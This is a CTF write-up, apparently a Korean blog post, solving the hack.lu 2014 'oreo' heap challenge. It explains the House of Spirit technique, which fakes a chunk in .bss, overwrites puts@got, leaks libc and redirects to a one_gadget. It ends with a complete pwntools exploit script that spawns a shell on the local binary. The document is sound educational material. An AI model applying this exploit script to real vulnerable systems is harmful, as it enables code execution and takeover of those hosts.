---
title: hack.lu 2014 - oreo
date: 2018-09-17 14:19:53
categories:
- Heap Exploit
- CTF write up
tags:
- House Of Spirit
---
```
Welcome to the OREO Original Rifle Ecommerce Online System!
     ,______________________________________
    |_________________,----------._ [____]  -,__  __....-----=====
                   (_(||||||||||||)___________/                   |
                      `----------'   OREO [ ))"-,                   |
                                           ""    `,  _,--....___    |
                                                   `/           """"	
What would you like to do?
```



## Binary Information

```
oreo: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=f591eececd05c63140b9d658578aea6c24450f8b, stripped
```

```
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
```



## House of Spirit

:: free 해줄 때 넣어주는 인자 값을 fake_chunk 주소로 변경해 fake_chunk 메모리에 malloc이 되도록 한다.



```c
unsigned int Message_order()
{
  unsigned int canary; // ST1C_4

  canary = __readgsdword(0x14u);
  printf("Enter any notice you'd like to submit with your order: ");
  fgets(order_message, 128, stdin);
  Make_null(order_message);
  return __readgsdword(0x14u) ^ canary;
}
```

```
.bss:0804A2A8 order_message   dd ?                    ; DATA XREF: Message_order+23↑r
.bss:0804A2A8                                         ; Message_order+3C↑r ...
.bss:0804A2AC                 align 20h
.bss:0804A2C0 order_addr      db    ? ;               ; DATA XREF: main+29↑o
.bss:0804A2C1                 db    ? ;
.bss:0804A2C2                 db    ? ;
```

bss 영역을 보면 message를 출력할 때, order_message 변수에 message가 저장되어 있는 order_addr 주소를 넣고  영역을 포인터로 전달한다.



rifle 구조체

```
00000000 rifle           struc ; (sizeof=0x38, align=0x4, copyof_5)
00000000 description     db 25 dup(?)
00000019 name            db 26 dup(?)
00000033                 db ? ; undefined
00000034 addr            dd ?                    ; offset
00000038 rifle           ends
```

```c
unsigned int Show_rifles()
{
  rifle *i; // [esp+14h] [ebp-14h]
  unsigned int canary; // [esp+1Ch] [ebp-Ch]

  canary = __readgsdword(0x14u);
  printf("Rifle to be ordered:\n%s\n", "===================================");
  for ( i = malloc_addr; i; i = (rifle *)i->addr )
  {
    printf("Name: %s\n", i->name);
    printf("Description: %s\n", i);
    puts("===================================");
  }
  return __readgsdword(0x14u) ^ canary;
}
```

rifle을 보여주는 메뉴인데, rifle 구조체의 addr 변수 부분을 이용해 null 일 때 까지 출력을 합니다. 이를 이용해 우리가 원하는 addr에 fake_chunk addr을 넣어주고 이 부분이 free 가 되게 한다. fake_chunk에서 malloc size도 맞춰주어야 하므로 rifle count 가 0x41 or 0x40이 되게 한다. 이 malloc 부분이 order_message 변수 부분을 포함하게 된다.

order_message 변수에 puts@got 를 넣고 이 주소에 one_gadget을 넣으면 쉘을 획득할 수 있다.



```python
from pwn import *
 
p = process("./oreo")
#context.log_level = 'debug'
 
def add(name, desc):
    p.sendline('1')
    p.sendline(name)
    p.sendline(desc)
 
def order():
    p.sendline('3')
 
def message(msg):
    p.sendline('4')
    p.sendline(msg)
 
def status():
    p.sendline('5')
    p.recvuntil('Message: ')
    leak = p.recvuntil('=')
    return leak[0:4]
 
fake = 0x804a2a0
puts = 0x804a248 
 
for i in range(0,0x40-1):
    add(str(i),str(i))
 
message(p32(0x00)*9+p32(0x40))
 
add("x"*27+p32(fake+0x8),'xx')
 
order()
 
add("aa" ,p32(puts))
 
leak = status()
offset = 0x5fca0
libc = u32(leak) - offset
log.info("Libc_base :::"+hex(libc))
 
one_gadget = 0x5fbc5
message(p32(libc+one_gadget))
 
p.interactive()
 
```

